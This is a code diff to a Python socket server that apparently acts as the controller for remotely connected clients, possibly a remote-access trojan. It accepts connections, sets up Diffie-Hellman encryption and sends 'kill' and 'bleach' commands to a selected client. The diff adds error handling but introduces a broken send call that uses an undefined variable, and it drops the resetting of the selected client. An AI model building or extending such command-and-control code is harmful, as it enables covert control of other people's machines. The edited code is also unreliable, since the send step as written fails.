@@ -50,6 +50,7 @@ class Server(threading.Thread):
 
     @staticmethod
     def _setup_server_socket(port):
+        # setup + return listening server socket
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server_socket.bind(('0.0.0.0', port))
@@ -57,6 +58,7 @@ class Server(threading.Thread):
         return server_socket
 
     def run(self):
+        # accepting new client connections
         while True:
             conn, addr = self.server_socket.accept()
             dhkey = diffiehellman(conn)
@@ -69,10 +71,13 @@ class Server(threading.Thread):
             print('[!] no client selected (or client disconnected) [!]') # ensure object is not None before proceeding
             return
         try:
-            encrypted_message = encrypt(message, client.dhkey)
-            client.conn.send(encrypted_message)
+            encrypted_message = crypto.encrypt(message, client.dhkey)
+            try:
+                client.conn.send(encrypted)
+            except socket.error as e:
+                print(f'[!] error sending data: {e} [!]')
         except Exception as e:
-            print(f'error: {e}')
+            print(f'[!] encryption error: {e} [!]')
 
     def recv_client(self, client):
         if client is None:
@@ -97,18 +102,26 @@ class Server(threading.Thread):
     def kill_client(self, _):
         if self.current_client is None:
             print('[!] no client selected [!]') # check against server's current state
+            return
         self.send_client('kill', self.current_client)
-        self.current_client.conn.close()
+        self.close_client_connection(self.current_client)
         self.remove_client(self.current_client.uid)
-        self.current_client = None
 
     def bleach_client(self, _):
         if self.current_client is None:
             print('[!] no client selected [!]') # check against server's current state
+            return
         self.send_client('bleach', self.current_client)
-        self.current_client.conn.close()
+        self.close_client_connection(self.current_client)
         self.remove_client(self.current_client.uid)
-        self.current_client = None
+
+    def close_client_connection(self, client):
+        # close connection to client
+        try:
+            client.conn.shutdown(socket.SHUT_RDWR)
+            client.conn.close()
+        except socket.error as e:
+            print(f'[!] error closing connection: {e} [!]')
 
     def get_clients(self):
         return [v for _, v in self.clients.items()]
